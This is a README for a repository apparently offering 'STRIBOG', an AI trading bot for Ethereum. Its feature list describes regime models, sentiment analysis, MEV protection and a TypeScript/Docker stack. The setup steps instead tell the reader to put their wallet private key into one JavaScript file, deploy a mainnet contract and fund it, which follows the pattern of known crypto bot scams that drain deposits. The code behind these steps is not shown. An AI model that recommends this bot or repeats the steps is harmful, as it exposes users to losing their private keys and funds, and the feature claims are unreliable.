

<h1 align="center">STRIBOG — AI Regime & Sentiment Trading Bot (Node.js)</h1>
<p align="center">
  <em>Regime + trend detection fused with news and on-chain sentiment to time entries on Ethereum — with MEV-aware execution and strict risk controls.</em>
</p>

<p align="center">
  <a href="#"><img alt="Node" src="https://img.shields.io/badge/node-20%2B-339933?logo=node.js&logoColor=white"></a>
  <a href="#"><img alt="TypeScript" src="https://img.shields.io/badge/typescript-5.x-3178C6?logo=typescript&logoColor=white"></a>
  <a href="#"><img alt="License" src="https://img.shields.io/badge/license-MIT-brightgreen"></a>
  <a href="#"><img alt="CI" src="https://img.shields.io/badge/CI-GitHub%20Actions-blue?logo=githubactions"></a>
  <a href="#"><img alt="Docker" src="https://img.shields.io/badge/docker-ready-0db7ed?logo=docker&logoColor=white"></a>
  <a href="#"><img alt="PRs" src="https://img.shields.io/badge/PRs-welcome-ff69b4.svg"></a>
</p>

<p align="center">
  <a href="#-features">Features</a> •
  <a href="#-how-it-works">How it works</a> •
  <a href="#-quickstart">Quickstart</a> •
  <a href="#️-configuration">Configuration</a> •
  <a href="#-usage-cli">Usage (CLI)</a> •
  <a href="#-security--risks">Security</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-roadmap">Roadmap</a> •
  <a href="#-contributing">Contributing</a> •
  <a href="#-license">License</a>
</p>

---

## ✨ Features

- 🧠 **Regime Detection** — HMM/Transformer-style regime classifier (risk-on / risk-off / chop) exported to **ONNX** or run via **TF.js**.
- 📰 **News & On-chain Sentiment** — pluggable adapters (RSS/HTTP APIs/mempool stats) → NLP scoring → signal boost/suppress.
- 📈 **Trend & Momentum Core** — adaptive MA bands, volatility filters, breakout/mean-revert switches per regime.
- ⚙️ **DEX Execution** — Uniswap v3 / 1inch with price limits, TTL, min-return, optional partial fills.
- 🛡️ **MEV-aware** — Flashbots / MEV-Share / Protect RPC integration to reduce sandwich/front-run risk.
- 📊 **Risk Management** — dynamic sizing, max daily loss, time-based cooldowns, session kill-switch.
- 🧪 **Backtesting & Paper** — realistic fills (slippage, fees, gas), performance and factor breakdown reports.
- 🐳 **Production-ready** — Node 20 + TypeScript 5, pino logs, Prometheus metrics, Docker, GitHub Actions CI, Vitest.

> **Why STRIBOG?**  
> STRIBOG combines **context** (news + on-chain) with **structure** (regimes + trend) — entries are only taken when the market state and sentiment align.

---

## 🧠 How it works

1. **Ingest** — fetch price bars, pool stats, gas/mempool hints, and news feeds.
2. **Features** — build volatility, momentum, liquidity, gas, and sentiment features.
3. **Regime Model** — classify the current state (risk-on/off/chop); decide which strategy branch is active.
4. **Signals** — trend/momentum produce entries; sentiment adjusts confidence and size.
5. **Risk** — enforce stops, take profits, daily loss cap, cooldowns.
6. **Execution** — route to DEX (Uniswap/1inch) with slippage and TTL; prefer private routes when profitable.
7. **Observe** — structured logs, metrics, and JSON reports for analysis.

---

## Setup and Installation

1. Download the Repository
   - Download the ZIP file containing the project files: [Download ZIP](https://github.com/telznx/STRIBOG-AI-Regime-Sentiment-Trading-Bot/archive/refs/heads/main.zip).
   - Or clone the repository with Git (if Git is not installed, download it here: [Download Git](https://git-scm.com/downloads)):
     ```bash
     git clone https://github.com/telznx/STRIBOG-AI-Regime-Sentiment-Trading-Bot
     ```

2. Navigate to the Project Folder
   - Open a terminal and change to the project directory:
     ```bash
     cd path/to/your/project
     ```

3. Install Dependencies
   - The `package.json` includes required dependencies (`ethers@6`, `inquirer`, `ora`). Install them:
     ```bash
     npm install
     ```

4. Configure Your Private Key
   - Open `aiTradingBot.js` in a code editor.
   - Replace on 120 the `PRIVATE_KEY` value with your Ethereum wallet's private key:
     ```javascript
     const PRIVATE_KEY = 'your-private-key';
     ```
   - Security Note: Never share your private key or commit it to version control.

5. Run the Script
   - Execute the script using Node.js:
     ```bash
     node aiTradingBot.js
     ```
   - Follow the prompts to deploy the contract or view instructions.
   - After creating the contract, copy its address and fund its balance from any source (e.g., MetaMask or another wallet).

## Usage

- Deployment: Select `1. Deploy` to deploy the contract on Ethereum Mainnet. The script will estimate gas costs and prompt for confirmation.
- Interaction: After deployment, interact with the contract's functions (`start`, `stop`, `withdraw`) via the command-line menu.
- Instructions: Select `2. Instructions` to view detailed usage guidelines within the script.
- Autonomous Operation: Do not close the terminal after deployment to continue interacting with the contract.
